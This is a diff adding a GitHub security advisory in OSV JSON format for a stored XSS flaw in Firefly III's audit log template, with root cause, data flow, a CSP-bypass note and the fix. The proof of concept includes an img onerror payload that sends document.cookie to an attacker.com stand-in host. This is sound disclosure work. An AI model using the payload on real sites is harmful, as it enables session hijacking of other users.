@@ -1,0 +1,63 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-6jq6-x4cx-qvcm",
+  "modified": "2026-06-12T15:04:50Z",
+  "published": "2026-06-12T15:04:50Z",
+  "aliases": [],
+  "summary": "Firefly II has Stored XSS in Audit Log Entry view via piggy bank name (ale.twig)",
+  "details": "## Summary\n\nThe Twig template `resources/views/list/ale.twig` renders the piggy bank name from `AuditLogEntry.after.piggy` using the `|raw` filter, bypassing Twig's auto-escaping. A piggy bank created with an HTML payload in its name executes arbitrary JavaScript in any browser viewing that transaction's audit log.\n\n## Root Cause\n\nThe `|raw` filter is required on the outer `trans()` call to preserve `<span>` tags in the `amount` parameter (currency styling). However, this also disables escaping for the user-controlled `name` parameter.\n\n**Vulnerable code (`resources/views/list/ale.twig` lines 107, 110):**\n```twig\n{{ trans('firefly.ale_action_log_add', {\n    amount: formatAmountBySymbol(...),\n    name: logEntry.after.piggy\n})|raw }}\n```\n\nNo HTML sanitization at storage time — `PiggyBankStoreRequest` only validates `min:1|max:255|uniquePiggyBankForUser`.\n\n## Data Flow\n\n```\nPOST /api/v1/piggy-banks {\"name\": \"<img src=x onerror=...>\"}\n  → Stored verbatim in piggy_banks.name\n  → Transaction rule fires add_to_piggy / remove_from_piggy\n  → UpdatePiggyBank::handle() stores AuditLogEntry.after.piggy = raw name\n  → Any user views /transactions/show/{id}\n  → ale.twig outputs unescaped payload → XSS fires\n```\n\n## CSP Note\n\nThe nonce-based CSP (`script-src 'nonce-...' 'strict-dynamic'`) does **not** prevent this attack. Inline event handlers (`onerror`, `onload`) in HTML attributes are governed by `script-src-attr`, which is unrestricted in the current policy. The `<img onerror=...>` payload bypasses the nonce requirement entirely.\n\n## PoC\n\n1. Authenticate as any user\n2. `POST /api/v1/piggy-banks` with `\"name\": \"<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>\"`\n3. Create a rule: action = \"Add money to piggy bank [attacker's piggy bank]\"\n4. Trigger the rule on any transaction\n5. Visit `/transactions/show/{id}` → payload fires\n\n**Confirmed server response (v6.6.2):**\n```html\nAdded <span class=\"text-success money-positive\">EUR 50.00</span> to piggy bank\n\"<img src=x onerror=alert(document.cookie)>\"\n```\n\n## Impact\n\n- Stored XSS persists in DB — fires for every user who views the transaction\n- Cookie theft → session hijacking\n- In multi-user setups: one user attacks another user or admin\n- Chainable with CSRF-like operations\n\n## Fix\n\nPR #12271 (merged into `develop`): add `|e` to escape only the user-controlled `name` parameter.\n\n```twig\n{{ trans('firefly.ale_action_log_add', {\n    amount: formatAmountBySymbol(...),\n    name: logEntry.after.piggy|e\n})|raw }}\n```",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "grumpydictator/firefly-iii"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.6.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 6.6.2"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/firefly-iii/firefly-iii/security/advisories/GHSA-6jq6-x4cx-qvcm"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/firefly-iii/firefly-iii/pull/12271"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/firefly-iii/firefly-iii"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-116",
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-06-12T15:04:50Z",
+    "nvd_published_at": null
+  }
+}
